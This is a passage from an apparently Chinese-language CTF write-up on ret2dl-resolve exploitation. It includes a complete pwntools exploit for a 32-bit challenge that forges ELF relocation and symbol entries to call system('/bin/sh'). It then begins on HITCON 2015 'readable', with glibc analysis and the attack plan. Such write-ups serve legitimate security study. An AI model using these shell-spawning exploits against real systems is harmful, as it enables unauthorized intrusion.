<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">shellcode = <span class="string">""</span></span><br><span class="line">shellcode += p32(read_plt) + p32(ppp_ret) + p32(<span class="number">0</span>) + p32(reloc_data_addr) + p32(len(reloc_data))</span><br><span class="line">shellcode += p32(read_plt) + p32(ppp_ret) + p32(<span class="number">0</span>) + p32(sym_data_addr) + p32(len(sym_data))</span><br><span class="line">shellcode += p32(read_plt) + p32(ppp_ret) + p32(<span class="number">0</span>) + p32(func_name_addr) + p32(len(func_name))</span><br><span class="line">shellcode += p32(read_plt) + p32(ppp_ret) + p32(<span class="number">0</span>) + p32(binsh_str_addr) + p32(len(binsh_str))</span><br><span class="line">shellcode += p32(main_addr)</span><br><span class="line">ebp = p32(<span class="number">0xdeadbeef</span>)</span><br><span class="line">payload = <span class="string">'A'</span>*<span class="number">0x90</span> + p32(<span class="number">0</span>) + <span class="string">'A'</span>*<span class="number">8</span> + ebp + shellcode</span><br></pre></td></tr></table></figure>
<ul>
<li>3、程序从<code>标准输入</code>读取<strong><code>“name”</code></strong>的时候，同<code>第一步</code>一样。程序从<code>标准输入</code>读取<strong><code>“slogan”</code></strong>的时候，输入<code>另一段</code>精心构造的<code>一段ROP的shellcode</code>，劫持程序的<code>控制流</code>。首先调用<code>PLT0</code>处的代码，传入伪造的<code>system函数重定位表项</code>相对于<code>重定位表起始</code>的偏移量<code>reloc_index</code>，利用<strong><code>_dl_runtime_resolve()函数</code></strong>进行<code>system函数地址</code>的解析。<code>_dl_runtime_resolve()</code>函数解析完<code>system函数</code>的地址后，就会<code>调用system函数</code>。</li>
</ul>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">shellcode = <span class="string">""</span></span><br><span class="line">shellcode += p32(PLT0) + p32(reloc_index) + p32(main_addr) + p32(binsh_str_addr)</span><br><span class="line">payload = <span class="string">'A'</span>*<span class="number">0x90</span> + p32(<span class="number">0</span>) + <span class="string">'A'</span>*<span class="number">8</span> + ebp + shellcode</span><br></pre></td></tr></table></figure>
<p><strong><code>完整exp：</code></strong><br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Author:Sp4n9x</span></span><br><span class="line"><span class="comment"># -*- coding:utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.clear()</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line">context.binary = <span class="string">'./pwn200'</span></span><br><span class="line">context = &#123;<span class="string">'arch'</span>:<span class="string">'i386'</span>,<span class="string">'bits'</span>:<span class="string">'32'</span>,<span class="string">'endian'</span>:<span class="string">'little'</span>,<span class="string">'os'</span>:<span class="string">'linux'</span>&#125;</span><br><span class="line"></span><br><span class="line">DT_JMPREL = <span class="number">0x080482F8</span></span><br><span class="line">DT_SYMTAB = <span class="number">0x080481E0</span></span><br><span class="line">DT_STRTAB = <span class="number">0x08048260</span></span><br><span class="line">DT_VERSYM = <span class="number">0x080482C0</span></span><br><span class="line">PLT0 = <span class="number">0x08048350</span></span><br><span class="line">BSS_Addr = <span class="number">0x08049870</span></span><br><span class="line"></span><br><span class="line">system_got = <span class="number">0x080499A0</span></span><br><span class="line">ppp_ret = <span class="number">0x08048646</span></span><br><span class="line">send_plt = <span class="number">0x080483A0</span></span><br><span class="line">read_plt = <span class="number">0x08048360</span></span><br><span class="line">read_got = <span class="number">0x08049850</span></span><br><span class="line">strlen_got = <span class="number">0x08049858</span></span><br><span class="line">main_addr = <span class="number">0x080484AC</span></span><br><span class="line"></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">typedef struct &#123;</span></span><br><span class="line"><span class="string">    Elf32_Addr r_offset; /* 表示重定位所作用的虚拟地址或相对基地址的偏移 */ 4byte</span></span><br><span class="line"><span class="string">    Elf32_Word r_info;   /* 重定位类型和符号表下标 */ 4byte</span></span><br><span class="line"><span class="string">&#125; Elf32_Rel;</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">generate_x86_reloc_data</span><span class="params">(sym_index,got_plt)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> p32(got_plt) + p32(<span class="number">0x07</span> + (sym_index&lt;&lt;<span class="number">8</span>))</span><br><span class="line"></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">typedef struct &#123;</span></span><br><span class="line"><span class="string">    Elf32_Word    st_name;  /* 符号名，符号在字符串表中的偏移 */ 4byte</span></span><br><span class="line"><span class="string">    Elf32_Addr    st_value; /* 符号的值，可能是地址或偏移 */ 4byte</span></span><br><span class="line"><span class="string">    Elf32_Word    st_size;  /* 符号的大小 */ 4byte</span></span><br><span class="line"><span class="string">    unsigned char st_info;  /* 符号类型及绑定属性 */ 1byte</span></span><br><span class="line"><span class="string">    unsigned char st_other; /* 符号的可见性 */ 1byte</span></span><br><span class="line"><span class="string">    Elf32_Section st_shndx; /* 节头表索引 */ 2byte</span></span><br><span class="line"><span class="string">&#125; Elf32_Sym;</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">generate_x86_sym_data</span><span class="params">(name_offset)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> p32(name_offset) + p32(<span class="number">0</span>) + p32(<span class="number">0</span>) + p32(<span class="number">0x12</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># BSS_Addr(0x08049870) = DT_JMPREL(0x080482F8) + reloc_offset(0x1578)</span></span><br><span class="line">reloc_offset = <span class="number">0x1578</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># sym_data_addr(0x080499C0) = DT_SYMTAB(0x080481E0) + sym_index(0x17e) * 16   (not useful)</span></span><br><span class="line">reloc_data_addr = BSS_Addr</span><br><span class="line">reloc_data = generate_x86_reloc_data(<span class="number">0x17e</span>,system_got)</span><br><span class="line"></span><br><span class="line"><span class="comment"># func_name_addr(0x080499E0) = DT_STRTAB(0x08048260) + name_offset(0x1780)</span></span><br><span class="line">sym_data_addr = <span class="number">0x080499C0</span></span><br><span class="line">sym_data = generate_x86_sym_data(<span class="number">0x1780</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># func_name_addr(0x080499E0) = sym_data_addr + 0x20</span></span><br><span class="line">func_name_addr = sym_data_addr + <span class="number">0x20</span></span><br><span class="line">func_name = <span class="string">"system\x00"</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># binsh_str_addr(0x080499F0) = func_name_addr + 0x10</span></span><br><span class="line">binsh_str_addr = func_name_addr + <span class="number">0x10</span></span><br><span class="line">binsh_str = <span class="string">"/bin/sh\x00"</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">str_to_hex</span><span class="params">(str)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">''</span>.join([<span class="string">'\\x'</span> + <span class="string">'%02X'</span> % ord(c) <span class="keyword">for</span> c <span class="keyword">in</span> str])</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_io</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">if</span> args[<span class="string">'REMOTE'</span>]:</span><br><span class="line">        io = remote(<span class="string">'218.2.197.235'</span>,<span class="number">10101</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        io = process(<span class="string">'./pwn200'</span>)</span><br><span class="line">        <span class="comment"># io = gdb.debug('./pwn200','''</span></span><br><span class="line">        <span class="comment">#                             bp 0x080484AC</span></span><br><span class="line">        <span class="comment">#                             bp 0x08048507</span></span><br><span class="line">        <span class="comment">#                             bp 0x08048524</span></span><br><span class="line">        <span class="comment">#                             bp 0x08048579</span></span><br><span class="line">        <span class="comment">#                             bp 0x08048596</span></span><br><span class="line">        <span class="comment">#                             bp 0x080485b8''')</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> io</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">pwn</span><span class="params">(io)</span>:</span></span><br><span class="line">    <span class="comment"># gdb.attach(io,'''</span></span><br><span class="line">    <span class="comment">#                 bp 0x080484AC</span></span><br><span class="line">    <span class="comment">#                 bp 0x08048507</span></span><br><span class="line">    <span class="comment">#                 bp 0x08048524</span></span><br><span class="line">    <span class="comment">#                 bp 0x08048579</span></span><br><span class="line">    <span class="comment">#                 bp 0x08048596</span></span><br><span class="line">    <span class="comment">#                 bp 0x080485b8''')</span></span><br><span class="line">    <span class="keyword">print</span> <span class="string">"----------------Stage1: Fake system's reloc_data,sym_data and str_data.----------------"</span></span><br><span class="line">    <span class="comment"># raw_input('[1] before receive "input name:\x00"')</span></span><br><span class="line">    io.recvuntil(<span class="string">"input name:\x00"</span>)</span><br><span class="line">    name = <span class="string">"syclover\x00"</span>.ljust(<span class="number">17</span>,<span class="string">"\xff"</span>)</span><br><span class="line">    <span class="comment"># raw_input('[2] before send name')</span></span><br><span class="line">    io.send(name)</span><br><span class="line">    <span class="keyword">print</span> <span class="string">"name:"</span> + name</span><br><span class="line">    <span class="comment"># raw_input('[3] before receive "input slogan:\x00"')</span></span><br><span class="line">    io.recvuntil(<span class="string">"input slogan:\x00"</span>)</span><br><span class="line">    shellcode = <span class="string">""</span></span><br><span class="line">    shellcode += p32(read_plt) + p32(ppp_ret) + p32(<span class="number">0</span>) + p32(reloc_data_addr) + p32(len(reloc_data))</span><br><span class="line">    shellcode += p32(read_plt) + p32(ppp_ret) + p32(<span class="number">0</span>) + p32(sym_data_addr) + p32(len(sym_data))</span><br><span class="line">    shellcode += p32(read_plt) + p32(ppp_ret) + p32(<span class="number">0</span>) + p32(func_name_addr) + p32(len(func_name))</span><br><span class="line">    shellcode += p32(read_plt) + p32(ppp_ret) + p32(<span class="number">0</span>) + p32(binsh_str_addr) + p32(len(binsh_str))</span><br><span class="line">    shellcode += p32(main_addr)</span><br><span class="line">    ebp = p32(<span class="number">0xdeadbeef</span>)</span><br><span class="line">    payload = <span class="string">'A'</span>*<span class="number">0x90</span> + p32(<span class="number">0</span>) + <span class="string">'A'</span>*<span class="number">8</span> + ebp + shellcode</span><br><span class="line">    <span class="keyword">print</span> <span class="string">"payload_len:"</span> + str(len(payload))</span><br><span class="line">    <span class="keyword">print</span> <span class="string">"payload:"</span> + payload[<span class="number">0</span>:<span class="number">0x90</span>] + str_to_hex(payload[<span class="number">0x90</span>:<span class="number">0x94</span>]) + payload[<span class="number">0x94</span>:<span class="number">0x9C</span>] + str_to_hex(payload[<span class="number">0x9C</span>:])</span><br><span class="line">    <span class="comment"># raw_input('[4] before send payload')</span></span><br><span class="line">    io.send(payload)</span><br><span class="line">    <span class="comment"># raw_input('[5] before send reloc_data')</span></span><br><span class="line">    io.send(reloc_data)</span><br><span class="line">    <span class="comment"># raw_input('[6] before send sym_data')</span></span><br><span class="line">    io.send(sym_data)</span><br><span class="line">    <span class="comment"># raw_input('[7] before send func_name')</span></span><br><span class="line">    io.send(func_name)</span><br><span class="line">    <span class="comment"># raw_input('[8] before send binsh_str')</span></span><br><span class="line">    io.send(binsh_str)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">print</span> <span class="string">"----------------Stage2: Call system(\"/bin/sh\")----------------"</span></span><br><span class="line">    <span class="comment"># raw_input('[9] before receive "input name:\x00"')</span></span><br><span class="line">    io.recvuntil(<span class="string">"input name:\x00"</span>)</span><br><span class="line">    name = <span class="string">"syclover\x00"</span>.ljust(<span class="number">17</span>,<span class="string">"\xff"</span>)</span><br><span class="line">    <span class="comment"># raw_input('[10] before send name')</span></span><br><span class="line">    io.send(name)</span><br><span class="line">    <span class="keyword">print</span> <span class="string">"name:"</span> + name</span><br><span class="line">    <span class="comment"># raw_input('[11] before receive "input slogan:\x00"')</span></span><br><span class="line">    io.recvuntil(<span class="string">"input slogan:\x00"</span>)</span><br><span class="line">    shellcode = <span class="string">""</span></span><br><span class="line">    shellcode += p32(PLT0) + p32(reloc_offset) + p32(main_addr) + p32(binsh_str_addr)</span><br><span class="line">    payload = <span class="string">'A'</span>*<span class="number">0x90</span> + p32(<span class="number">0</span>) + <span class="string">'A'</span>*<span class="number">8</span> + ebp + shellcode</span><br><span class="line">    <span class="keyword">print</span> <span class="string">"payload_len:"</span> + str(len(payload))</span><br><span class="line">    <span class="keyword">print</span> <span class="string">"payload:"</span> + payload[<span class="number">0</span>:<span class="number">0x90</span>] + str_to_hex(payload[<span class="number">0x90</span>:<span class="number">0x94</span>]) + payload[<span class="number">0x94</span>:<span class="number">0x9C</span>] + str_to_hex(payload[<span class="number">0x9C</span>:])</span><br><span class="line">    <span class="comment"># raw_input('[12] before send payload')</span></span><br><span class="line">    io.send(payload)</span><br><span class="line"></span><br><span class="line">    io.interactive()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    io = get_io()</span><br><span class="line">    pwn(io)</span><br></pre></td></tr></table></figure></p>
<h3 id="4-3、x64的情况——HITCON-CTF-2015–readable"><a href="#4-3、x64的情况——HITCON-CTF-2015–readable" class="headerlink" title="4.3、x64的情况——HITCON CTF 2015–readable"></a>4.3、x64的情况——HITCON CTF 2015–readable</h3><h4 id="0、x86情况与x64情况的不同之处"><a href="#0、x86情况与x64情况的不同之处" class="headerlink" title="0、x86情况与x64情况的不同之处"></a>0、x86情况与x64情况的不同之处</h4><p>1、<strong><code>相关结构体大小</code></strong>不同：</p>
<blockquote>
<ul>
<li><strong><code>动态链接重定位表“.rel.plt”</code></strong>：<strong><code>x86情况</code></strong>使用<code>Elf32_Rel</code>，大小为<code>2*4=8字节</code>。<strong><code>x64情况</code></strong>使用<code>Elf64_Rela</code>，大小为<code>3*8=24字节</code>。<strong><code>x86情况</code></strong>的结构体成员<code>r_info</code>中<code>符号表下标</code>和<code>重定位类型</code>分别占用<code>3字节</code>和<code>1字节</code>。<strong><code>x64情况</code></strong>的结构体成员<code>r_info</code>中<code>符号表下标</code>和<code>重定位类型</code>分别占用<code>4字节</code>和<code>4字节</code>。</li>
<li><strong><code>动态链接符号表“.dynsym”</code></strong>：<strong><code>x86情况</code></strong>使用<code>Elf32_Sym</code>，大小为<code>4*4=16字节</code>。<strong><code>x64情况</code></strong>使用<code>Elf64_Sym</code>，大小为<code>3*8=24字节</code>。<code>x86情况</code>和<code>x64情况</code>结构体成员的顺序不同。</li>
</ul>
</blockquote>
<p>2、<strong><code>reloc_arg含义</code></strong>不同：</p>
<blockquote>
<ul>
<li>1、<strong><code>x86情况</code></strong>: <code>reloc_arg == reloc_offset</code>，含义是所重定位符号的<code>重定位项</code>距离<code>重定位表“.rel.plt”</code>起始位置的<code>偏移</code>。重定位项地址<code>reloc = JMPREL + reloc_offset</code>。</li>
<li>2、<strong><code>x64情况</code></strong>: <code>reloc_arg == reloc_index</code>，含义是所重定位符号的<code>重定位项</code>在<code>重定位表“.rel.plt”</code>中的<code>下标</code>。重定位项地址<code>reloc = JMPREL + reloc_index*3*8</code>。</li>
</ul>
</blockquote>
<p>3、<strong><code>符号版本表(.gnu.version)</code></strong><br><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (l-&gt;l_info[VERSYMIDX (DT_VERSYM)] != <span class="literal">NULL</span>)   </span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">//获取动态符号版本表“.gnu.version”的地址</span></span><br><span class="line">    <span class="function"><span class="keyword">const</span> <span class="title">ElfW</span><span class="params">(Half)</span> *vernum </span>= (<span class="keyword">const</span> <span class="keyword">void</span> *) D_PTR (l, l_info[VERSYMIDX (DT_VERSYM)]);</span><br><span class="line">    <span class="comment">//ndx是当前符号所使用的glibc库版本在版本需要表(.gnu.version_r)中的版本结构体的vna_other成员的值</span></span><br><span class="line">    ElfW(Half) ndx = vernum[ELFW(R_SYM) (reloc-&gt;r_info)] &amp; <span class="number">0x7fff</span>; </span><br><span class="line">    <span class="comment">//l_version数组存储的是版本需要表(.gnu.version_r)中包含的二进制程序实际依赖的glibc库版本结构体指针</span></span><br><span class="line">    version = &amp;l-&gt;l_versions[ndx];  <span class="comment">//得到当前所解析符号的glibc库版本信息</span></span><br><span class="line">    <span class="keyword">if</span> (version-&gt;hash == <span class="number">0</span>)</span><br><span class="line">        version = <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>&emsp;&emsp;这段代码取<code>r_info的高位</code>作为<strong><code>符号版本表vernum(.gnu.version)</code></strong>的<code>下标</code>，访问对应的值并赋给<code>ndx</code>，<code>ndx</code>再作为<code>l_versions</code>表的<code>下标</code>，找到对应的值赋给<code>version</code>。<strong><code>ndx</code></strong>是当前符号所使用的<code>glibc库版本</code>在<strong><code>版本需要表(.gnu.version_r)</code></strong>中的<code>版本结构体(Elfxx_Vernaux)</code>的<code>vna_other</code>成员的值。<strong><code>l_versions</code></strong>是结构体<code>r_found_version</code>的数组。<strong><code>version</code></strong>表示的是<strong><code>版本需要表(.gnu.version_r)</code></strong>中包含的<code>此ELF文件</code>实际依赖的<code>glibc库版本结构体(r_found_version)</code>的指针。<br>&emsp;&emsp;<strong><code>64位情况</code></strong>下，我们构造的<code>fake链</code>一般位于<strong><code>bss节</code></strong>(<code>64位</code>下，<code>bss节</code>一般位于<strong><code>0x600000</code></strong>之后)，<strong><code>重定位表“.rela.plt”</code></strong>一般在<strong><code>0x400000</code></strong>左右，所以我们构造的<code>r_info的高位(sym_index)</code>和<code>reloc_arg</code>一般会很大。又因为计算符号项地址<strong><code>&amp;symtab[ELFW(R_SYM) (reloc-&gt;r_info)]</code></strong>和符号版本项地址<strong><code>vernum[ELFW(R_SYM) (reloc-&gt;r_info)]</code></strong>时，<code>数组的数据类型</code>的大小不同(<strong><code>symtab</code></strong>中的结构体大小为<code>0x18字节</code>，<strong><code>vernum</code></strong>的数据类型为<code>uint16_t</code>，大小为<code>0x2字节</code>)，这就导致<code>vernum[ELFW(R_SYM) (reloc-&gt;r_info)]</code>大概率会访问到<code>0x400000</code>到<code>0x600000</code>之间的<code>不可读区域</code>(64位下，这个区间一般不可读)，使得程序报错。<br>&emsp;&emsp;<strong><code>32位情况</code></strong>下，我们构造的<code>r_info的高位(sym_index)</code>和<code>reloc_arg</code>很小，所以计算<strong><code>vernum[ELFW(R_SYM) (reloc-&gt;r_info)]</code></strong> == <strong><code>vernum + sym_index*2</code></strong>时，不会访问到<code>不可访问</code>的区域。所以我们只要让<code>vernum + sym_index*2</code>访问到的<code>ndx值合理</code>即可。关于<code>ndx的取值范围</code>在我的另一篇文章中有介绍，但也<code>只是猜测</code>。——<code>RCTF2015-WriteUp(Pwn)</code>。</p>
<p>为了<code>防止</code>出现这个错误，我们有几种方法。</p>
<blockquote>
<ul>
<li><strong><code>方法一：</code></strong>我们需要修改<code>判断流程</code>，使得<strong><code>l-&gt;l_info[VERSYMIDX (DT_VERSYM)]</code></strong>为0，从而绕开这块代码。而<code>l-&gt;l_info[VERSYMIDX (DT_VERSYM)]</code>在<strong><code>64位</code></strong>中的位置就是<code>link_map+0x1c8</code>。对应的，<code>32位</code>下为<code>link_map+0xe4</code>，所以我们需要<code>泄露link_map地址</code>，将其置为0。这种攻击方式依赖<code>源程序</code>自带的<code>输出函数</code>。</li>
<li><strong><code>方法二：</code></strong>使得<strong><code>vernum[ELFW(R_SYM) (reloc-&gt;r_info)]</code></strong> == <strong><code>vernum + sym_index*2</code></strong>可读，并且读出的<code>ndx值合理</code>。我们可以通过修改<code>.dynamic节</code>中<code>DT_VERSYM动态节类型</code>所对应的<code>动态节表项</code>，使<code>vernum表的地址</code>改变。然后影响<code>vernum + sym_index*2</code>的计算结果，使得到<code>符号版本表项的地址</code>可读，并且此地址处的<code>ndx值合理</code>。<code>ndx的值</code>一般不宜太大，设为<code>0x0000</code>应该是通用的。这种攻击方式依赖<code>源程序</code>自带的<code>输入函数</code>。能够任意地址写。</li>
</ul>
</blockquote>
<h4 id="1、检查程序开启的保护机制-1"><a href="#1、检查程序开启的保护机制-1" class="headerlink" title="1、检查程序开启的保护机制"></a>1、检查程序开启的保护机制</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">$ checksec readable</span><br><span class="line">[*] &apos;/home/******/Desktop/remote-dbg/readable&apos;</span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    No RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x400000)</span><br></pre></td></tr></table></figure>
<p>可以看到此程序只开启了<code>NX(堆栈不可执行)</code>。</p>
<h4 id="2、静态分析-1"><a href="#2、静态分析-1" class="headerlink" title="2、静态分析"></a>2、静态分析</h4><p>IDA反编译后<code>主函数</code>如下：<br><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">ssize_t</span> __<span class="function">fastcall <span class="title">main</span><span class="params">(__int64 a1, <span class="keyword">char</span> **a2, <span class="keyword">char</span> **a3)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> buf; <span class="comment">// [rsp+0h] [rbp-10h] buf大小只有16byte</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> read(<span class="number">0</span>, &amp;buf, <span class="number">32u</span>LL);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>&emsp;&emsp;这道题的<code>漏洞</code>很明显，<code>buf的实际大小</code>只有<code>16byte</code>，但是read()函数却<code>最大可以读取32byte</code>，这就造成了<code>栈溢出</code>，会覆盖<code>rbp</code>和<code>ret_address</code>。通过将<code>ret_address</code>覆盖为<code>main函数的入口地址</code>，从而对漏洞实现<code>多次利用</code>，达到<code>任意地址写</code>的目的。由于只有任意地址<code>写权限</code>，而没有<code>读权限</code>，因此几乎<code>无法泄露信息</code>，利用常规方法则会比较难。</p>
<h4 id="3、方法一：爆破read-中syscall的偏移，并修改eax为0x3b，调用execve-“-bin-sh”-0-0"><a href="#3、方法一：爆破read-中syscall的偏移，并修改eax为0x3b，调用execve-“-bin-sh”-0-0" class="headerlink" title="3、方法一：爆破read()中syscall的偏移，并修改eax为0x3b，调用execve(“/bin/sh”,0,0)"></a>3、方法一：爆破read()中syscall的偏移，并修改eax为0x3b，调用execve(“/bin/sh”,0,0)</h4><p><strong><code>利用思路：</code></strong></p>
<ul>
<li>1、爆破获取<code>read函数</code>中调用<code>syscall的偏移</code>，并将其覆盖到<code>read的GOT表内容</code>的<code>最后一个字节</code>，再将<code>eax</code>修改成<code>0x3b</code>，然后将<code>“/bin/sh”</code>压入栈，并将<code>rdi</code>指向它，同时将<code>rsi</code>和<code>rdx</code>分别设置为<code>0</code>，相当于调用了<strong><code>execve(&quot;/bin/sh&quot;,0,0)</code></strong>，从而实现shell的获取。</li>
</ul>
<p>每个<code>系统调用</code>中都有如下的实现：<br><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">;read函数</span></span><br><span class="line">&lt;read+n&gt; 	 <span class="keyword">mov</span> <span class="built_in">eax</span>,<span class="number">0x0</span></span><br><span class="line">&lt;read+(n+<span class="number">5</span>)&gt; <span class="keyword">syscall</span></span><br><span class="line"></span><br><span class="line"><span class="comment">;write函数</span></span><br><span class="line">&lt;write+n&gt; 	  <span class="keyword">mov</span> <span class="built_in">eax</span>,<span class="number">0x1</span></span><br><span class="line">&lt;write+(n+<span class="number">5</span>)&gt; <span class="keyword">syscall</span></span><br><span class="line"></span><br><span class="line"><span class="comment">;execve函数</span></span><br><span class="line">&lt;execve+n&gt; 	   <span class="keyword">mov</span> <span class="built_in">eax</span>,<span class="number">0x3b</span></span><br><span class="line">&lt;execve+(n+<span class="number">5</span>)&gt; <span class="keyword">syscall</span></span><br></pre></td></tr></table></figure></p>
<ul>
<li>2、如果知道了<code>read函数</code>中<code>syscall</code>距离<code>read函数起始位置</code>的<code>偏移</code>，那么直接将<code>read的GOT表内容</code>的<code>最后一个字节</code>修改为<code>此偏移</code>，同时通过<code>read函数</code>读取<code>系统调用号长度</code>的内容，使<code>eax</code>修改为<code>系统调用号</code>。这样，<code>调用read函数</code>的时候就相当于执行<code>其他系统调用</code>了。<code>爆破syscall偏移</code>的时候利用<code>write函数</code>进行<code>打印测试</code>，如果能够<code>正常打印</code>，则说明爆破出的<code>syscall偏移</code>是<code>正确的</code>，否则程序读取不到相关信息。</li>
</ul>
<p><strong><code>完整exp：</code></strong><br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span 